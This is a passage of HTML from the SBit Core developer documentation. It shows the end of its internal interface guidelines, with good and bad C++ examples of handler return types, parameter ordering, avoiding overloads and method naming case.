style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">using</span><span class="token plain"> TipChangedFn </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">function</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token keyword" style="color:rgb(86, 156, 214)">void</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> block_height</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int64_t</span><span class="token plain"> block_time</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">unique_ptr</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token plain">interfaces</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">Handler</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">handleTipChanged</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">TipChangedFn fn</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// Bad: returns boost connection specific to local process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">using</span><span class="token plain"> TipChangedFn </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">function</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token keyword" style="color:rgb(86, 156, 214)">void</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> block_height</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int64_t</span><span class="token plain"> block_time</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> boost</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">signals2</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">scoped_connection </span><span class="token function" style="color:rgb(220, 220, 170)">connectTipChanged</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">TipChangedFn fn</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></li><li><p>For consistency and friendliness to code generation tools, interface method
input and inout parameters should be ordered first and output parameters
should come last.</p><p>Example:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// Good: error output param is last</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">broadcastTransaction</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> CTransactionRef</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> tx</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> CAmount max_fee</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">string</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// Bad: error output param is between input params</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">broadcastTransaction</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> CTransactionRef</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> tx</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">string</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> error</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> CAmount max_fee</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></li><li><p>For friendliness to code generation tools, interface methods should not be
overloaded:</p><p>Example:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// Good: method names are unique</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">disconnectByAddress</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> CNetAddr</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> net_addr</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">disconnectById</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">NodeId id</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// Bad: methods are overloaded by type</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">disconnect</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> CNetAddr</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> net_addr</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">disconnect</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">NodeId id</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></li><li><p>For consistency and friendliness to code generation tools, interface method
names should be <code>lowerCamelCase</code> and standalone function names should be
<code>UpperCamelCase</code>.</p><p>Examples:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// Good: lowerCamelCase method name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">blockConnected</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> CBlock</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> block</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> height</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// Bad: uppercase class method</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">BlockConnected</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> CBlock</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> block</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> height</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// Good: UpperCamelCase standalone function name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">unique_ptr</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token plain">Node</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">MakeNode</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">LocalInit</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> init</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// Bad: lowercase standalone function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">unique_ptr</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token plain">Node</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">makeNode</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">LocalInit</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> init</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Note: This last convention isn&#x27;t generally followed outside of
<a href="https://github.com/SBit-Project/sbit/src/interfaces/" target="_blank" rel="noopener noreferrer"><code>src/interfaces/</code></a>, though it did come up for discussion
before in <a href="https://github.com/bitcoin/bitcoin/pull/14635" target="_blank" rel="noopener noreferrer">#14635</a>.</p></li></ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/sbit.dev/docs/SBit-Core/Development/benchmarking"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Benchmarking</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/sbit.dev/docs/SBit-Core/Development/dnsseed-policy"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">DNS Seed operators</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_cNA8 thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#coding-style-general" class="table-of-contents__link toc-highlight">Coding Style (General)</a></li><li><a href="#coding-style-c" class="table-of-contents__link toc-highlight">Coding Style (C++)</a></li><li><a href="#coding-style-python" class="table-of-contents__link toc-highlight">Coding Style (Python)</a></li><li><a href="#coding-style-doxygen-compatible-comments" class="table-of-contents__link toc-highlight">Coding Style (Doxygen-compatible comments)</a><ul><li><a href="#generating-documentation" class="table-of-contents__link toc-highlight">Generating Documentation</a></li></ul></li><li><a href="#development-tips-and-tricks" class="table-of-contents__link toc-highlight">Development tips and tricks</a><ul><li><a href="#compiling-for-debugging" class="table-of-contents__link toc-highlight">Compiling for debugging</a></li><li><a href="#compiling-for-gprof-profiling" class="table-of-contents__link toc-highlight">Compiling for gprof profiling</a></li><li><a href="#debuglog" class="table-of-contents__link toc-highlight">debug.log</a></li><li><a href="#testnet-and-regtest-modes" class="table-of-contents__link toc-highlight">Testnet and Regtest modes</a></li><li><a href="#debug_lockorder" class="table-of-contents__link toc-highlight">DEBUG_LOCKORDER</a></li><li><a href="#valgrind-suppressions-file" class="table-of-contents__link toc-highlight">Valgrind suppressions file</a></li><li><a href="#compiling-for-test-coverage" class="table-of-contents__link toc-highlight">Compiling for test coverage</a></li><li><a href="#performance-profiling-with-perf" class="table-of-contents__link toc-highlight">Performance profiling with perf</a></li><li><a href="#sanitizers" class="table-of-contents__link toc-highlight">Sanitizers</a></li></ul></li><li><a href="#lockingmutex-usage-notes" class="table-of-contents__link toc-highlight">Locking/mutex usage notes</a></li><li><a href="#threads" class="table-of-contents__link toc-highlight">Threads</a></li><li><a href="#ignoring-ideeditor-files" class="table-of-contents__link toc-highlight">Ignoring IDE/editor files</a></li><li><a href="#general-sbit-core" class="table-of-contents__link toc-highlight">General SBit Core</a></li><li><a href="#wallet" class="table-of-contents__link toc-highlight">Wallet</a></li><li><a href="#general-c" class="table-of-contents__link toc-highlight">General C++</a></li><li><a href="#c-data-structures" class="table-of-contents__link toc-highlight">C++ data structures</a></li><li><a href="#strings-and-formatting" class="table-of-contents__link toc-highlight">Strings and formatting</a></li><li><a href="#shadowing" class="table-of-contents__link toc-highlight">Shadowing</a></li><li><a href="#threads-and-synchronization" class="table-of-contents__link toc-highlight">Threads and synchronization</a></li><li><a href="#scripts" class="table-of-contents__link toc-highlight">Scripts</a><ul><li><a href="#shebang" class="table-of-contents__link toc-highlight">Shebang</a></li></ul></li><li><a href="#source-code-organization" class="table-of-contents__link toc-highlight">Source code organization</a></li><li><a href="#gui" class="table-of-contents__link toc-highlight">GUI</a></li><li><a href="#upgrading-leveldb" class="table-of-contents__link toc-highlight">Upgrading LevelDB</a><ul><li><a href="#file-descriptor-counts" class="table-of-contents__link toc-highlight">File Descriptor Counts</a></li><li><a href="#consensus-compatibility" class="table-of-contents__link toc-highlight">Consensus Compatibility</a></li></ul></li><li><a href="#scripted-diffs" class="table-of-contents__link toc-highlight">Scripted diffs</a><ul><li><a href="#suggestions-and-examples" class="table-of-contents__link toc-highlight">Suggestions and examples</a></li></ul></li><li><a href="#release-notes" class="table-of-contents__link toc-highlight">Release notes</a></li><li><a href="#rpc-interface-guidelines" class="table-of-contents__link toc-highlight">RPC interface guidelines</a></li><li><a href="#internal-interface-guidelines" class="table-of-contents__link toc-highlight">Internal interface guidelines</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Get in touch</div><ul class="footer__items"><li class="footer__item"><a href="mailto: dev@sbit.dev" target="_blank" rel="noopener noreferrer" class="footer__link-item">Contact<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/docs/welcome">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items"><li class="footer__item"><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/SBit-Project/Book" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2022 - SBit Project</div></div></div></footer></div>
<script src="/sbit.dev/assets/js/runtime~main.f02a63ae.js"></script>
<script src="/sbit.dev/assets/js/main.55012172.js"></script>
</body>
</html>